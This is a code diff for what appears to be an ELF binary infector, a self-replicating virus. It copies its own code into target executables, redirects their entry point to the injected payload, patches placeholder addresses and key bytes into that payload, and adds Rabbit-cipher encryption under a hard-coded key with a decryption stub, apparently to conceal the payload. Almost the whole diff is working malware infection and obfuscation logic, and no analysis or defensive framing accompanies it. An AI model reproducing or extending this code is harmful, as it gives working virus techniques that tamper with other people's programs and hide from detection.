@@ -14,13 +14,18 @@ static int replace_addr(t_env *env, unsigned int needle, unsigned int replace, i
 					break;
 				}
 			}
-			if (found) {
-				if (offset == 1) // take current position in account
-					replace -= (i * 8 + j); // replace should be negative
-				*(unsigned int *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j] - 7) = replace + 7;
-				// replace "leave ret" (c9c3) by NOP to slide to jmp with replaced address
-				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 10) = 0x90;
-				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 9) = 0x90;
+			if (found && offset) {
+				if (offset == 7) {// take current position in account
+					replace -= (i * 8 + j); // replace should be relative to current position
+					*(unsigned int *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j] - 7) = replace + 7;
+					// replace "leave ret" (c9c3) by NOP to slide to jmp with replaced address
+					*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 10) = 0x90;
+					*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 9) = 0x90;
+				} else if (offset == 55) {
+					*(unsigned int *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j] - 55) = replace;
+				} else {
+					*(unsigned int *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j] - offset) = replace;
+				}
 				break;
 			}
 		}
@@ -33,8 +38,17 @@ static void inject_code(t_env *env) {
 	((Elf64_Ehdr *)env->obj_cpy)->e_entry = env->inject_addr + env->plt_offset;
 	// calc dist between original entry and the end and inject point
 	unsigned int inject_dist = env->inject_addr - env->entrypoint;
+	// replace decrypt start addr in payload
+	replace_addr(env, 0x41414141, 0x987, 55);
+	// replace encrypt size in payload
+	replace_addr(env, 0x41414141, env->encrypt_size, 38);
+	// replace key addr in payload
+	replace_addr(env, 0x41414141, (*(long unsigned int*)env->key << 32) >> 32, 32);
+	replace_addr(env, 0x41414141, *(long unsigned int*)env->key >> 32, 28);
+	replace_addr(env, 0x41414141, (*(long unsigned int*)(env->key+8) << 32) >> 32, 22);
+	replace_addr(env, 0x41414141, (*(long unsigned int*)(env->key+8)) >> 32, 18);
 	// replace jmp addr in payload
-	replace_addr(env, 0x42424242, -(inject_dist), 1);
+	replace_addr(env, 0x42424242, -inject_dist, 7);
 	// inject payload
 	ft_memmove(env->obj_cpy + env->inject_offset, env->payload_content, env->payload_size);
 }
@@ -155,8 +169,10 @@ static void tweak_elf(t_env *env) {
 }
 
 static int get_payload(t_env *env) {
-	size_t main_offset = (char *)&main - &__executable_start;
-	env->payload_size = &_end - &__executable_start - 0x1000; // this seems magic... but it's mesured exactly to avoid strings being loaded twice...
+	env->main_offset = (char *)&main - &__executable_start + 0x10;
+	size_t decrypt_offset = (char *)&decrypt - &__executable_start;
+	env->encrypt_size = &_end - (char *)&main - 0x1011; // this seems magic... but it's mesured exactly to avoid strings being loaded and encrypted twice...
+	env->payload_size = &_end - &__executable_start;
 	// save payload in env
 	/*if ((env->payload_content = malloc(env->payload_size + 16)) == NULL) {
 		if (DEBUG) printf("DEBUG PAYLOAD: malloc failed\n");
@@ -165,12 +181,12 @@ static int get_payload(t_env *env) {
 	if ((env->payload_content = syscall_mmap(0, env->payload_size + 16, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
 		return -1;
 	}
-	// coppy payload + prepend jump to main
+	// coppy payload + prepend jump to decrypt fct
 	ft_bzero(env->payload_content, env->payload_size + 16);
 	((char*)env->payload_content)[0] = 0xe9;
-	main_offset += 16 - 5;
-	unsigned char lsb = (unsigned)main_offset & 0xff; // mask the lower 8 bits
-	unsigned char msb = (unsigned)main_offset >> 8;   // shift the higher 8 bits
+	decrypt_offset += 16 - 5;
+	unsigned char lsb = (unsigned)decrypt_offset & 0xff; // mask the lower 8 bits
+	unsigned char msb = (unsigned)decrypt_offset >> 8;   // shift the higher 8 bits
 	((char*)env->payload_content)[2] = msb;
 	((char*)env->payload_content)[1] = lsb;
 	ft_memmove((char*)env->payload_content + 16, &__executable_start, env->payload_size);
@@ -201,10 +217,20 @@ static int handle_obj(t_env *env) {
 	ft_memmove(env->obj_cpy, env->obj, env->obj_size);
 	// tweak target file's headers
 	tweak_elf(env);
+	// generate Key
+	/*if (generate_key(env)) {
+		//if (DEBUG) printf("Error generating key.\n");
+		return -1;
+	}*/
+	ft_memmove(env->key, "aaaabbbbccccdddd\0", 17);
 	// inject and dump new obj
 	inject_code(env);
+	if (rabbit_encrypt(env)) { // ENCRYPT
+		//if (DEBUG) syscall_write(1, "Error encrypting elf.\n", 22);
+		return -1;
+	}
 	if (dump_obj(env)) {
-		//if (DEBUG) printf("Error dumping new object.\n");
+		//if (DEBUG) syscall_write(1, "Error dumping new object.\n", 26);
 		return -1;
 	}
 	// debug
